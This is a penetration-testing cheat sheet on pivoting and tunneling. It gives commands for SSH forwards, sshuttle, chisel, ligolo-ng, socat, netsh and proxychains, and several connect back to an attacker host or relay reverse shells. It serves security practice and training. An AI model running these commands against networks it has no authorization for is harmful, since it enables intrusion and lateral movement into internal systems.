+++
title = "Pivoting & Tunneling"
date = "2026-05-05T00:00:00-05:00"
tags = ["pivoting", "tunneling", "chisel", "ligolo", "ssh", "proxychains"]
description = "SSH port forwarding, chisel, ligolo-ng, socat, sshuttle, and proxychains for lateral movement through network segments."
draft = false
+++

## proxychains Setup

```bash
# /etc/proxychains4.conf — add at bottom
socks5 127.0.0.1 1080   # chisel reverse / ligolo
socks4 127.0.0.1 9050   # SSH dynamic

# Use with any tool
proxychains nmap -v -sT -Pn 172.16.5.19    # TCP connect only — no SYN scans
proxychains evil-winrm -i 172.16.5.10 -u admin -p pass
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass
proxychains msfconsole
```

---

## SSH Local Port Forward

Forward a remote port to your local machine.

```bash
# Access pivot host's port 3306 as localhost:1234
ssh -L 1234:localhost:3306 user@<pivot-host>

# Multiple forwards
ssh -L 1234:localhost:3306 -L 8080:localhost:80 user@<pivot-host>

# Verify
netstat -antp | grep 1234
nmap -v -sV -p1234 localhost
```

---

## SSH Dynamic Port Forward (SOCKS Proxy)

Route all traffic through the pivot host.

```bash
# Start SOCKS proxy on local port 9050
ssh -D 9050 user@<pivot-host>

# proxychains.conf
socks4 127.0.0.1 9050

proxychains nmap -v -sT -Pn 172.16.5.1-200
```

---

## SSH Remote / Reverse Port Forward

Catch a reverse shell through a firewall.

```bash
# Forward pivot-host:8080 → attacker:8000
# Useful when target can only reach the pivot host
ssh -R <pivot-host-ip>:8080:0.0.0.0:8000 user@<pivot-host> -vN

# Payload on target points to pivot host:8080
# MSF listener sits on attacker:8000
```

---

## sshuttle

Transparent proxy — no proxychains needed.

```bash
# Route entire subnet through pivot
sshuttle -r user@<pivot-host> 172.16.5.0/23 -v

# Exclude the pivot host itself to avoid loop
sshuttle -r user@<pivot-host> 172.16.5.0/23 --exclude <pivot-host-ip>
```

---

## Chisel

TCP/UDP tunnel over HTTP/SSH — good through strict firewalls.

### Forward Mode (pivot host as server)

```bash
# On pivot host
./chisel server -v -p 1234 --socks5

# On attacker
./chisel client -v <pivot-host>:1234 socks

# proxychains.conf
socks5 127.0.0.1 1080
```

### Reverse Mode (attacker as server)

```bash
# On attacker
sudo ./chisel server --reverse -v -p 1234 --socks5

# On pivot host
./chisel client -v <attacker-ip>:1234 R:socks

# proxychains.conf
socks5 127.0.0.1 1080
```

---

## Ligolo-ng

Creates a real tun interface — no proxychains needed for most tools.

### Setup (Attack Host)

```bash
# Create and bring up tun interface
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up

# Start proxy
./lin-proxy -selfcert
# or bind on specific port:
./lin-proxy -selfcert -laddr 0.0.0.0:443
```

### Connect Agent (Pivot Host)

```bash
chmod +x lin-agent
./lin-agent -connect <attacker-ip>:11601 -ignore-cert
```

### Activate Tunnel

```bash
# In ligolo console — select session, add route, start
ligolo-ng » session
[Agent: user@pivot] » start

# Add internal subnet route on attacker
sudo ip route add 172.16.5.0/24 dev ligolo

# Now reach internal hosts directly (no proxychains)
evil-winrm -i 172.16.5.10 -u admin -H <hash>
nmap -sV 172.16.5.10
```

### Double Pivot (Ligolo)

```bash
# In ligolo console on attacker — add listener to relay second agent
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

# On second pivot (Windows) — connect back through first pivot
./agent.exe -connect <first-pivot-internal-ip>:11601 -ignore-cert

# Add second-hop subnet route
sudo ip route add 172.16.9.0/24 dev ligolo
```

---

## socat

Port relay without SSH.

```bash
# Forward attacker:8080 → target:80
socat TCP-LISTEN:8080,fork TCP:<target>:80

# Reverse shell relay through pivot
# On pivot host:
socat TCP-LISTEN:8080,fork TCP:<attacker>:4444

# Bind shell relay
socat TCP-LISTEN:8080,fork TCP:<internal-host>:4444
```

---

## Windows Port Forwarding (netsh)

```powershell
# Forward port 8080 on pivot to internal host:80
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.5.10

# Verify
netsh interface portproxy show all

# Remove
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```

---

## Quick Reference

| Tool | Best For | Proxychains? |
|------|----------|--------------|
| SSH `-L` | Single port forward | No |
| SSH `-D` | SOCKS proxy all traffic | Yes |
| SSH `-R` | Reverse shell catch | No |
| sshuttle | Transparent subnet routing | No |
| chisel | HTTP-wrapped tunnel, strict firewall | Yes |
| ligolo-ng | Full tun interface, double pivot | No |
| socat | Stateless relay, no SSH needed | No |
| netsh | Windows-only port proxy | No |
